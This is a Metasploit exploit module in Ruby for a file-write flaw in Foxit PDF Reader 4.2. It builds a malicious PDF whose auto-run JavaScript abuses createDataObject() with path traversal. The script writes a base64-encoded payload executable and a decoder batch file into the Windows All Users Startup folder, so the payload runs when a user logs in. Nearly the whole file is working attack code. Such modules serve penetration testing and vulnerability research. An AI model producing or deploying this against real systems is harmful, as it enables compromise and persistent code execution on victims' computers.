##
# $Id: foxit_reader_filewrite.rb 11955 2011-03-14 12:01:55Z swtornio $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::EXE
	
	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Foxit PDF Reader 4.2 Javascript File Write',
			'Description'    => %q{
					This module exploits an unsafe Javascript API implemented in Foxit PDF Reader
					version 4.2. The createDataObject() Javascript API function allows for writing
					arbitrary files to the file system. This issue was fixed in version 4.3.1.0218.
					
					Note: This exploit uses the All Users directory currently, which required 
					administrator privileges to write to. This means an administrative user has to
					open the file to be successful. Kind of lame but thats how it goes sometimes in
					the world of file write bugs.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
			[ 
				'bannedit',  # metasploit module
				'Chris Evans' # Initial discover and exploit
			],
			'Version'        => '$Revision: 11955 $',
			'References'     =>
				[
					[ 'OSVDB', '71104' ],
					[ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/03/dangerous-file-write-bug-in-foxit-pdf.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Automatic', { 'auto' => true } ], # uses both 
					['Foxit PDF Reader v4.2 (Windows XP SP0-SP3)', {}],
					['Foxit PDF Reader v4.2 (Windows Vista/7/8/2008)', {}],
				],
			'DisclosureDate' => 'Mar 5 2011',
			'DefaultTarget'  => 0))

			register_options([
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
				OptString.new('DECODER', [ true, 'The decoder script.',  'vbs_b64']),
			], self.class)
	end

	def exploit
		decoder_file = rand_text_alpha(rand(6) + 1)
		payload_file = rand_text_alpha(rand(6) + 1)

		ext = '.b64'
		exe = generate_payload_exe
		payload_b64 = Rex::Text.encode_base64(exe)
		decoder = build_decoder(decoder_file, payload_file)
		path_old = 'c:/Documents and Settings/All Users/Start Menu/Programs/Startup/'
		path_new = 'c:/Users/All Users/Start Menu/Programs/Startup/'
		pdf = %Q|
%PDF 1 0 obj<</Pages 1 0 R /OpenAction 2 0 R>> 2 0 obj<</S /JavaScript /JS (
createDataObject\('#{path_old + "../../../../../WINDOWS/Temp/" + payload_file + ext}', "#{payload_b64}"\);
createDataObject\('#{path_old + decoder_file + '.bat'}', unescape\(\"#{decoder}\"\)\);
createDataObject\('#{path_new + "../../../../../WINDOWS/Temp/" + payload_file + ext}', "#{payload_b64}"\);
createDataObject\('#{path_new + decoder_file + '.bat'}', unescape\(\"#{decoder}\"\)\);) >> trailer<</Root 1 0 R>>|
		file_create(pdf)
	end

	def build_decoder(decoder_file, payload_file)
		file = []
		decoder_bat = Msf::Config.data_directory + "/exploits/cmdstager/"
		case datastore['DECODER']
		when 'vbs_b64_adodb'
			decoder_bat << datastore['DECODER']
		when 'vbs_b64'
			decoder_bat << datastore['DECODER']
		else
			print_status("Selected decoder is incompatible with this exploit.")
			print_status("Defaulting to vbs_b64 decoder.")
			decoder_bat << 'vbs_b64'
		end

		decoder = File.new(decoder_bat, "r").read
		decoder << "cscript //nologo C:/Windows/Temp/" + decoder_file + '.vbs'

		decoder.gsub!(/\"/, '\"')
		decoder.gsub!(/\n/, " && ")
		decoder.gsub!(/ENCODED/, "C:/Windows/Temp/" + payload_file + '.b64') # payload.b64
		decoder.gsub!(/DECODED/, "C:/Windows/Temp/" + payload_file + '.exe') # payload.exe
		decoder.gsub!(/decode_stub/, "C:/Windows/Temp/" + decoder_file + '.vbs')

		return decoder = Rex::Text.uri_encode(decoder)
 	end
end